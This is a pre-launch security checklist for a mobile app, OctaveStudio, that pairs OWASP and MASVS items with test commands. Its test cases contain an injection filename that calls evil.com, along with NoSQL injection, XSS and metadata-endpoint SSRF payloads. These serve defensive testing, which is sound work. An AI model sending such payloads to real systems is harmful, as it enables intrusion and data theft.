# Security Checklist & AppSec Gates: OctaveStudio
## Production Security Requirements

**Version:** 1.0  
**Last Updated:** 2024-12-27  
**Compliance:** OWASP Top 10 2021, MASVS (Mobile App Security Verification Standard)

---

## TL;DR

**Every checkbox must be ✅ before production launch. No exceptions.**

This isn't a wishlist—it's a contract between engineering and users. Each item represents a vulnerability that could leak user data, cost money, or damage trust.

---

## Pre-Launch Security Gate (Mandatory Checklist)

### Authentication & Authorization ✅

- [ ] **A01: Access Control** - Firestore security rules prevent User A from accessing User B's data (tested with emulator)
- [ ] **JWT Validation** - All Cloud Functions verify `context.auth.uid` matches resource owner
- [ ] **No Hardcoded Credentials** - Zero matches for `grep -r "sk-" . --include="*.ts"`
- [ ] **Session Management** - Firebase JWTs expire in 1 hour (auto-refreshed by SDK)
- [ ] **Custom Claims** - Subscription tier stored in JWT, not Firestore (prevents client tampering)

### Input Validation & Injection Prevention ✅

- [ ] **A03: Injection** - All inputs validated with Zod schemas (client + server)
- [ ] **XSS Prevention** - React Native auto-escapes, no `dangerouslySetInnerHTML` usage
- [ ] **Command Injection** - FFmpeg uses `spawn()` with array args, never `exec()`
- [ ] **NoSQL Injection** - Firestore SDK queries only, zero string concatenation
- [ ] **Content Moderation** - Perspective API integrated, toxic prompts blocked (score >0.7)

### Data Protection ✅

- [ ] **A02: Cryptography** - All HTTP traffic uses TLS 1.3 (verified with `curl -I`)
- [ ] **Secrets Management** - API keys in Cloud Secret Manager, rotated quarterly
- [ ] **PII Handling** - Emails/IPs hashed before logging (SHA-256, truncated to 8 chars)
- [ ] **Cloud Storage** - Buckets private by default, signed URLs expire in 1 hour
- [ ] **Encryption at Rest** - Cloud Storage uses AES-256 (verified in GCP Console)

### API Security ✅

- [ ] **Rate Limiting** - Enforced server-side (10/day free, 50/day pro)
- [ ] **Budget Alerts** - GCP alerts at $250, $450, $500 (Slack notifications)
- [ ] **Webhook Verification** - Stripe HMAC signatures verified before processing
- [ ] **CORS Configuration** - Only app domains allowed, no wildcard `*`
- [ ] **API Key Rotation** - Next rotation date: _______ (quarterly schedule)

### Mobile App Security (MASVS) ✅

- [ ] **Secure Storage** - Sensitive data in expo-secure-store (iOS Keychain, Android Keystore)
- [ ] **Certificate Pinning** - Firebase certificates pinned (network_security_config.xml)
- [ ] **Code Obfuscation** - ProGuard enabled for Android release builds
- [ ] **No Debugging** - `__DEV__` checks prevent debug features in production
- [ ] **Binary Protection** - iOS signed with Apple Distribution cert, Android with release keystore

### Dependency Management ✅

- [ ] **A06: Vulnerable Components** - `npm audit` passes (0 high/critical vulnerabilities)
- [ ] **Expo SDK Updated** - On latest stable (currently SDK 51)
- [ ] **Dependabot Enabled** - GitHub PRs for outdated packages (verified in repo settings)
- [ ] **Lockfile Committed** - `package-lock.json` in version control
- [ ] **No Pinned Old Versions** - No `~` or `^` preventing security updates

### Monitoring & Incident Response ✅

- [ ] **A09: Logging Failures** - Sentry configured (error tracking)
- [ ] **Audit Logs** - Sensitive operations logged (account deletion, tier changes)
- [ ] **Alerting** - Slack webhooks for P0/P1 incidents
- [ ] **Log Retention** - 400+ days (Cloud Logging default)
- [ ] **Incident Playbook** - Breach response documented (72-hour notification)

### OWASP Penetration Testing ✅

- [ ] **Manual Tests** - Access control bypass attempts failed (User A cannot read User B's data)
- [ ] **Rate Limit Test** - 11th request in one day rejected with `resource-exhausted`
- [ ] **XSS Test** - `<script>alert('XSS')</script>` renders as text, not executed
- [ ] **OWASP ZAP Scan** - Automated scan shows 0 high/medium vulnerabilities
- [ ] **Secrets Exposure** - `grep -r "r8_" dist/` returns 0 matches (no API keys in client bundle)

---

## OWASP Top 10 Deep Dive

### A01:2021 – Broken Access Control

**Test Case 1: User A Cannot Access User B's Projects**

```bash
# Get User A's token
USER_A_TOKEN=$(firebase auth:export --format=json | jq -r '.users[0].localId')

# Try to read User B's project
curl -X GET \
  "https://firestore.googleapis.com/v1/projects/octave-studios/databases/(default)/documents/users/userB/projects/proj123" \
  -H "Authorization: Bearer $USER_A_TOKEN"

# Expected: 403 Forbidden
# Actual: ___________
```

**Test Case 2: Cloud Function Ownership Check**

```typescript
// Attempt to delete another user's project
await deleteProject({
  projectId: "proj_belonging_to_user_b"
});

// Expected: "permission-denied" error
// Actual: ___________
```

**Firestore Security Rules (Must Pass Emulator Tests):**

```javascript
// tests/security/firestore.test.ts
import { assertFails, assertSucceeds } from '@firebase/rules-unit-testing';

test('blocks users from reading other users data', async () => {
  const alice = testEnv.authenticatedContext('alice');
  const bobDoc = alice.firestore().doc('users/bob/projects/proj1');
  await assertFails(bobDoc.get()); // ✅ MUST FAIL
});

test('allows users to read their own data', async () => {
  const alice = testEnv.authenticatedContext('alice');
  const aliceDoc = alice.firestore().doc('users/alice/projects/proj1');
  await assertSucceeds(aliceDoc.get()); // ✅ MUST SUCCEED
});
```

**Run:** `npm test -- security/firestore.test.ts`

---

### A02:2021 – Cryptographic Failures

**Test Case 1: TLS 1.3 Enforcement**

```bash
# Try HTTP (should redirect to HTTPS)
curl -I http://storage.googleapis.com/octave-studios.appspot.com/test.mp3

# Expected: 301 Moved Permanently → https://...
# Actual: ___________
```

**Test Case 2: Secrets Not in Code**

```bash
# Search for hardcoded API keys
grep -r "sk-" . --include="*.ts" --include="*.tsx" --include="*.js"
grep -r "r8_" . --include="*.ts"
grep -r "Bearer " . --include="*.ts"

# Expected: 0 matches
# Actual: ___________
```

**Test Case 3: PII Hashing**

```typescript
// Check logs don't contain raw emails
console.log('User logged in:', hashEmail(user.email)); // ✅ CORRECT

function hashEmail(email: string): string {
  return crypto.createHash('sha256').update(email).digest('hex').substring(0, 8);
}

// Expected log: "User logged in: a3f4c2d1"
// Actual: ___________
```

---

### A03:2021 – Injection

**Test Case 1: NoSQL Injection (Firestore)**

```bash
# Try NoSQL injection in userId parameter
curl -X POST https://us-central1-octave-studios.cloudfunctions.net/getProjects \
  -d '{"userId":"abc123\" OR 1=1 --"}'

# Expected: 404 Not Found (Firestore treats as literal string)
# Actual: ___________
```

**Test Case 2: Command Injection (FFmpeg)**

```typescript
const maliciousFilename = "song.mp3; curl http://evil.com/steal";
await processAudio(maliciousFilename);

// Expected: FFmpeg error (invalid filename), NOT curl execution
// Actual: ___________
```

**Test Case 3: XSS in React Native**

```typescript
const xssPayload = "<script>alert('XSS')</script>";
render(<Text>{xssPayload}</Text>);

// Expected: Renders literal text, NOT executed script
// Actual: ___________
```

---

### A04:2021 – Insecure Design

**Test Case 1: Rate Limiting**

```typescript
// Spam 11 requests in one day (free tier limit = 10)
for (let i = 0; i < 11; i++) {
  await generateSong({ prompt: `test ${i}` });
}

// Expected: First 10 succeed, 11th throws "resource-exhausted"
// Actual: ___________
```

**Test Case 2: Budget Protection**

```bash
# Verify budget alert exists
gcloud billing budgets list --billing-account=ABC123

# Expected: Budget "OctaveStudio Monthly" with $500 limit
# Actual: ___________
```

**Test Case 3: Spam Detection**

```typescript
// Submit identical prompt 5 times in a row
const prompt = "test song";
for (let i = 0; i < 5; i++) {
  await generateSong({ prompt });
}

// Expected: 4th or 5th request rejected (spam detection)
# Actual: ___________
```

---

### A05:2021 – Security Misconfiguration

**Test Case 1: Cloud Storage ACLs**

```bash
# Try to access audio file without signed URL
curl -I https://storage.googleapis.com/octave-studios.appspot.com/users/abc/song.mp3

# Expected: 403 Forbidden
# Actual: ___________
```

**Test Case 2: No Stack Traces in Production**

```bash
# Trigger error, check response
curl -X POST https://us-central1-octave-studios.cloudfunctions.net/generateSong \
  -d '{"prompt":"","genre":"invalid"}'

# Expected: Generic message, NO stack trace
# Actual: ___________
```

**Test Case 3: Firestore Rules Deployed**

```bash
firebase deploy --only firestore:rules

# Test in console: Read /users/alice as user "bob"
# Expected: Permission denied
# Actual: ___________
```

---

### A06:2021 – Vulnerable Components

**Test Case 1: npm audit**

```bash
npm audit --production

# Expected: 0 high/critical vulnerabilities
# Actual: ___________
```

**Test Case 2: Expo SDK Version**

```bash
npx expo-doctor

# Expected: All packages on latest Expo SDK (51)
# Actual: ___________
```

**Test Case 3: Dependabot Enabled**

```bash
# Check .github/dependabot.yml exists
cat .github/dependabot.yml

# Expected: Weekly scans configured
# Actual: ___________
```

---

### A07:2021 – Authentication Failures

**Test Case 1: Password Policy**

```bash
# Try weak password
firebase auth:signup --email test@example.com --password "123"

# Expected: Error (minimum 8 characters)
# Actual: ___________
```

**Test Case 2: Session Expiry**

```typescript
const user = auth().currentUser;
const token = await user.getIdToken();
const decoded = JSON.parse(atob(token.split('.')[1]));

console.log('Expires in:', (decoded.exp * 1000 - Date.now()) / 1000 / 60, 'minutes');

// Expected: ~60 minutes
// Actual: ___________
```

---

### A08:2021 – Software Integrity Failures

**Test Case 1: Lockfile Committed**

```bash
git log package-lock.json | head -n 5

# Expected: Recent commits showing lockfile updates
# Actual: ___________
```

**Test Case 2: iOS Code Signing**

```bash
eas build --platform ios --profile production

# Expected: "Code Signing Identity: Apple Distribution: FlashFusion LLC"
# Actual: ___________
```

---

### A09:2021 – Logging Failures

**Test Case 1: Audit Logs Exist**

```typescript
// Trigger sensitive operation
await deleteAccount(userId);

// Check Cloud Logging
gcloud logging read "AUDIT: User account deletion" --limit 1

# Expected: Log entry with userId, timestamp, IP
# Actual: ___________
```

**Test Case 2: Log Retention**

```bash
# Check retention policy
gcloud logging sinks list

# Expected: 400+ days
# Actual: ___________
```

---

### A10:2021 – Server-Side Request Forgery

**Test Case 1: URL Whitelist**

```bash
# Try internal metadata endpoint
curl -X POST https://us-central1-octave-studios.cloudfunctions.net/fetchUrl \
  -d '{"url":"http://metadata.google.internal/"}'

# Expected: "URL not allowed"
# Actual: ___________
```

---

## Mobile App Security (MASVS)

### MASVS-STORAGE-1: Secure Storage

**Test Case:**

```typescript
// Store auth token securely
await SecureStore.setItemAsync('authToken', token);

// ❌ WRONG: Plain AsyncStorage
await AsyncStorage.setItem('authToken', token);

# Expected: SecureStore uses iOS Keychain / Android Keystore
# Actual: ___________
```

---

### MASVS-NETWORK-1: TLS & Certificate Pinning

**Test Case:**

```bash
# Check network_security_config.xml exists
cat android/app/src/main/res/xml/network_security_config.xml

# Expected: Firebase certificate pins configured
# Actual: ___________
```

---

### MASVS-RESILIENCE-4: Code Obfuscation

**Test Case:**

```bash
# Check ProGuard enabled
cat android/app/build.gradle | grep minifyEnabled

# Expected: minifyEnabled true
# Actual: ___________
```

---

## Pre-Launch Security Audit (External)

### Week Before Launch: Hire Security Firm

**Recommended Firms:**

- Cure53 (Europe) - €5,000-€10,000
- NCC Group (US) - $10,000-$15,000
- Trail of Bits (US) - $15,000-$25,000

**Scope:**

1. Web application penetration test (API endpoints)
2. Mobile app security review (iOS + Android)
3. Infrastructure audit (Firebase, Cloud Functions)
4. Code review (GitHub repo access)

**Deliverables:**

- Penetration test report (PDF)
- Executive summary (for CEO)
- Remediation guidance (for engineers)

**Timeline:** 1 week testing + 1 week remediation

---

## Ongoing Security Operations

### Daily

- [ ] Check Sentry for new errors (on-call engineer)
- [ ] Monitor Cloud Logging for anomalies (automated alerts)

### Weekly

- [ ] Run `npm audit --production` (CI/CD)
- [ ] Review flagged prompts in Firestore (manual review)

### Monthly

- [ ] Review audit logs for unusual activity (security lead)
- [ ] Check failed login attempts (>10 from single IP = investigate)

### Quarterly

- [ ] Rotate API keys (Replicate, Mubert, OpenAI, ElevenLabs)
- [ ] Update Firestore security rules (test with emulator first)
- [ ] Run OWASP ZAP scan (automated)

### Annually

- [ ] External penetration test (security firm)
- [ ] Security training for all engineers (OWASP workshop)

---

## Incident Response Playbook

### Data Breach (Unauthorized Access to Firestore)

**Detection:** Cloud Logging shows unusual read patterns (e.g., 1,000 docs read in 1 minute)

**Response (Within 1 Hour):**

1. **Contain:**
   - Revoke all Firebase Auth tokens: `firebase auth:clear-sessions`
   - Disable affected Cloud Functions
   - Block attacker IP in Cloud Armor (if identified)

2. **Investigate (Within 4 Hours):**
   - Check Cloud Logging for unauthorized access patterns
   - Identify scope: How many users affected?
   - Root cause: Misconfigured security rule? Compromised API key?

3. **Remediate (Within 8 Hours):**
   - Fix vulnerability (deploy patched security rules)
   - Rotate all API keys (Replicate, Mubert, OpenAI)
   - Force password reset for affected users

4. **Notify (Within 72 Hours - GDPR):**
   - Email affected users
   - File breach report with data protection authority (if EU users)
   - Post-mortem document (internal only)

5. **Prevent (Within 2 Weeks):**
   - Add automated test for vulnerability
   - Update security checklist
   - Team training on secure coding

---

## Security Contacts

| Role | Email | Phone |
|------|-------|-------|
| **Security Lead** | security@octavestudio.com | - |
| **On-Call Engineer** | oncall@octavestudio.com | - |
| **Legal (GDPR)** | legal@octavestudio.com | - |

**Report Security Issue:** security@octavestudio.com (PGP key on website)

---

## Sign-Off (Required Before Launch)

- [ ] **Security Lead:** _________________ Date: _______
- [ ] **CTO:** _________________ Date: _______
- [ ] **CEO:** _________________ Date: _______

**All checkboxes must be ✅ before production launch.**

---

## Document History

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | 2024-12-27 | Security Team | Initial checklist for MVP launch |

**Next Review:** After Sprint 8 (Security Audit, March 2, 2025)
